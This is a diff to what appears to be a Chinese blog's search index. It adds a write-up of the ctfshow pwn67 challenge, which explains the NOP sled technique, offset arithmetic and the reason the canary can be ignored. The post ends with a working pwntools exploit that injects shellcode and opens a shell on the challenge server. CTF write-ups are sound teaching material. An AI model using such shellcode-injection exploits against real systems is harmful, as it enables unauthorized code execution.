@@ -55,7 +55,104 @@
 <p>希望可以帮到你，加油</p>
 ]]></content>
       <tags>
-        <tag>CTF PWN 网络安全</tag>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow pwn入门 pwn67</title>
+    <url>/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/</url>
+    <content><![CDATA[<h2 id="pwn67"><a href="#pwn67" class="headerlink" title="pwn67"></a>pwn67</h2><p><a href="https://ctf.show/challenges#pwn67-4077">ctf.show pwn67</a> </p>
+<span id="more"></span>
+
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id = "jump1">题目</a></h4><img src="/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>5h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>题目标题是<code>nop sled</code>,我们先来说一下原理是什么</p>
+<p><strong>NOP sled</strong> 是通过连续的 <strong>NOP</strong> 指令（通常是 <code>0x90</code>）在内存中构造一个 “滑道”，使得程序能够在没有精确控制跳转地址的情况下，依然能“滑行”到我们注入的 <strong>shellcode</strong>。这是一种应对 <strong>地址随机化</strong>（如 ASLR）和 <strong>精确跳转控制</strong> 不足的攻击技术。</p>
+<p>我们首先使用<code>checksec ./pwn</code>看一下它的保护机制</p>
+<img src="/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/2.png" class="" title="This is an image">
+
+<p>我们可以看到这是32位程序，开启了canary，但是NX没有开启，代表我们是可以进行shellcode注入的</p>
+<p>我们打开ida查看程序的<strong>主函数</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *position; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v5)(<span class="type">void</span>); <span class="comment">// [esp+0h] [ebp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">1027</span>]; <span class="comment">// [esp+4h] [ebp-100Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  seed[<span class="number">1025</span>] = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;argc;</span><br><span class="line">  seed[<span class="number">1024</span>] = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  srand((<span class="type">unsigned</span> <span class="type">int</span>)seed);</span><br><span class="line">  Loading();</span><br><span class="line">  acquire_satellites();</span><br><span class="line">  position = query_position();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We need to load the ctfshow_flag.\nThe current location: %p\n&quot;</span>, position);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What will you do?\n&gt; &quot;</span>);</span><br><span class="line">  fgets((<span class="type">char</span> *)seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Where do you start?\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>query_position函数</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">query_position</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+3h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">  v3 = &amp;v1 + v2;</span><br><span class="line">  <span class="keyword">return</span> &amp;v1 + v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码的逻辑：</strong></p>
+<ol>
+<li>程序会先输出一些字符，还有一个<strong>地址</strong>，根据query_position函数来看这个地址<code>position = &amp;v1+v2</code></li>
+<li>程序让我们输入一串字符串（大小是4096）给到<code>seed变量</code></li>
+<li>输入一串地址赋值给v5</li>
+</ol>
+<h5 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a><strong>大致思路：</strong></h5><p>在<code>checksec ./pwn</code>时，我们发现了有canary保护机制，如果平常的话，我们可能通过爆破canary来解这道题，但是本题需要我们去爆破canary吗？？</p>
+<p><strong>首先</strong>，我们是通过往seed里面去写shellcode，在通过<code>scanf函数</code>输入v5的地址直接跳转到v5(我们的v5可以是shellcode的地址)，根本不需要用到canary，因为canary是用来保护返回地址的，而这道题我们<strong>不是用覆盖返回地址</strong>来写的，自然不用去爆破canary。</p>
+<p><strong>再说的详细一点就是</strong></p>
+<blockquote>
+<p><strong>因为程序的漏洞点不是返回地址覆盖，而是可控函数指针 <code>v5</code>。</strong></p>
+</blockquote>
+<p>我们通过 <code>fgets</code> 往 seed[] 里写入了 shellcode，然后使用：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%p&quot;</span>, &amp;v5);</span><br><span class="line">v5();</span><br></pre></td></tr></table></figure>
+
+<p>直接控制程序跳转到 seed[]。<br> 整个过程不经过函数返回，也不会触发栈保护 Canary，因此不需要泄露或爆破 Canary</p>
+<p>现在你应该知道为什么不需要爆破canary了</p>
+<p><strong>现在我们要计算输入v5的地址是多少</strong></p>
+<p>我画了一个栈的图更方便我们去理解（上面是高地址，下面是低地址）</p>
+<img src="/2025/11/16/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn67/3.png" class="" title="This is an image">
+
+<ol>
+<li><p>**v1距seed的距离：**v1的位置是<code>ebp-15h</code>那么它与query_position的ebp的距离是<code>15h</code></p>
+</li>
+<li><p><strong>输入v5的值：</strong></p>
+<p>因为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v2 = rand() % <span class="number">1337</span> - <span class="number">668</span>;</span><br><span class="line">v3 = &amp;v1 + v2;</span><br><span class="line"><span class="keyword">return</span> &amp;v1 + v2;</span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<ul>
+<li>position &#x3D; &amp;v1 + v2 &#x3D; &amp;v1 + rand() % 1337 - 668 （我们假设<code>rand()%1337</code>为random），所以 <strong>position &#x3D; &amp;v1 + random - 668</strong>(random ∈ [0,1336])</li>
+<li>由上面可得<strong>v1&#x3D;position-random+668</strong></li>
+<li>因为v1距seed的距离是0x2d，所以seed &#x3D; v1 + 0x2d &#x3D; position - random + 668 + 0x2d</li>
+<li>因为我们输入的v5一定是在第一个nop之后，在shellcode之前的，我们可以让<code>v5 = position + 668 + 0x2d </code>,我们需要保证nop的长度在shellcode之前，所以我们可以让<strong>nop的长度&#x3D;1336</strong>（或者更长，但是加上shellcode,你不能超过seed的长度）</li>
+</ul>
+<p>现在就知道我们每一个数值都是多少了</p>
+<ol>
+<li>nop的长度是1336</li>
+<li>v5&#x3D;position+668+0x2d</li>
+</ol>
+<p>构造exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28164</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;current location:&quot;</span>)</span><br><span class="line">position_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"><span class="built_in">print</span>(position_addr)</span><br><span class="line">payload = <span class="string">b&quot;\x90&quot;</span> * <span class="number">1336</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入v5的地址</span></span><br><span class="line">v5_addr = position_addr + <span class="number">668</span> + <span class="number">0x2d</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(v5_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><code>\x90</code>就是nop的机器码</li>
+</ul>
+<h4 id="我遇见的一些问题（可能会把你绕晕）"><a href="#我遇见的一些问题（可能会把你绕晕）" class="headerlink" title="我遇见的一些问题（可能会把你绕晕）"></a>我遇见的一些问题（可能会把你绕晕）</h4><ol>
+<li><p>在query_position函数的汇编代码中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080487D1 ; __unwind &#123;</span><br><span class="line">.text:080487D1                 push    ebp</span><br><span class="line">.text:080487D2                 mov     ebp, esp</span><br><span class="line">.text:080487D4                 push    ebx</span><br><span class="line">.text:080487D5                 sub     esp, 14h</span><br><span class="line">.text:080487D8                 call    __x86_get_pc_thunk_ax</span><br><span class="line">.text:080487DD                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080487E2                 mov     ebx, large gs:14h</span><br><span class="line">.text:080487E9                 mov     [ebp+var_C], ebx</span><br><span class="line">.text:080487EC                 xor     ebx, ebx</span><br><span class="line">.text:080487EE                 mov     ebx, eax</span><br><span class="line">.text:080487F0                 call    _rand</span><br><span class="line">.text:080487F5                 mov     ecx, eax</span><br><span class="line">.text:080487F7                 mov     edx, 6208CECBh</span><br><span class="line">.text:080487FC                 mov     eax, ecx</span><br><span class="line">.text:080487FE                 imul    edx</span><br><span class="line">.text:08048800                 sar     edx, 9</span><br><span class="line">.text:08048803                 mov     eax, ecx</span><br><span class="line">.text:08048805                 sar     eax, 1Fh</span><br><span class="line">.text:08048808                 sub     edx, eax</span><br><span class="line">.text:0804880A                 mov     eax, edx</span><br><span class="line">.text:0804880C                 imul    eax, 539h</span><br><span class="line">.text:08048812                 sub     ecx, eax</span><br><span class="line">.text:08048814                 mov     eax, ecx</span><br><span class="line">.text:08048816                 sub     eax, 29Ch</span><br><span class="line">.text:0804881B                 mov     [ebp+var_14], eax</span><br><span class="line">.text:0804881E                 mov     eax, [ebp+var_14]</span><br><span class="line">.text:08048821                 lea     edx, [ebp+var_15]</span><br><span class="line">.text:08048824                 add     eax, edx</span><br><span class="line">.text:08048826                 mov     [ebp+var_10], eax</span><br><span class="line">.text:08048829                 mov     eax, [ebp+var_10]</span><br><span class="line">.text:0804882C                 mov     ebx, [ebp+var_C]</span><br><span class="line">.text:0804882F                 xor     ebx, large gs:14h</span><br><span class="line">.text:08048836                 jz      short loc_804883D</span><br><span class="line">.text:08048838                 call    __stack_chk_fail_local</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li><p>在<code>.text:080487D5                 sub     esp, 14h</code>行，发现query_position函数栈帧给局部变量分配了14h的空间，但是v1的位置为什么是ebp-15h，那不应该分配15h的空间吗？？？</p>
+<p>**答：**在<code>sub esp, 14h</code>这一行明确指定了栈帧的局部变量就是14h,这个是不可怀疑的。但是为什么v1在ebp-15h? </p>
+<ul>
+<li><strong><code>v1</code></strong> 的偏移是 <strong><code>ebp-0x15</code></strong>，是因为 <code>v1</code> 只是一个 1 字节的 <code>char</code> 类型，而栈对齐要求 <code>v2</code>（<code>int</code> 类型）必须按照 4 字节对齐。因此，在 <code>v1</code> 后面插入了 3 字节的填充。</li>
+<li><strong><code>v2</code></strong> 紧接着 <code>v1</code> 后面，占用 4 字节，对齐到 4 字节边界。</li>
+</ul>
+<p><strong>所以，栈上的偏移量是 <code>ebp-0x15</code>，是由于填充字节的存在，符合 4 字节对齐规则。偏移量是相对 ebp 的，并不是要求 offset 最大值 &#x3D; 局部变量区大小</strong></p>
+</li>
+</ul>
+<p>希望可以帮到你，加油！</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
 </search>
